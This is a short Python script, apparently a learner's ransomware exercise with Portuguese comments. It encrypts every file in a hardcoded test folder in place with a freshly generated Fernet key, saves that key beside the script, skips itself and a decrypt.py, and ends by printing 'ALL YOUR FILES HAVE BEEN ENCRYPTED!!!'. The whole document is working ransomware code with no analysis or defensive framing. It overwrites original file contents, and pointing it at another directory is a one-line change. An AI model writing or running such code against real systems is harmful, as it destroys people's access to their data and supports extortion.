import os
from cryptography.fernet import Fernet

diretorio = r"D:\Desktop\Ransomware\Teste"  # Prefixo 'r' para indicar uma "string bruta"
files = []

for file in os.listdir(diretorio):
    if file == "ransomware.py" or file == "mykey.key" or file == "decrypt.py":
        continue
    file_path = os.path.join(diretorio, file)
    if os.path.isfile(file_path):  # Verifica se o file_path é um arquivo
        files.append(file_path)

print("Encrypted files: ", files)

key = Fernet.generate_key()

with open("mykey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)

print("ALL YOUR FILES HAVE BEEN ENCRYPTED!!!")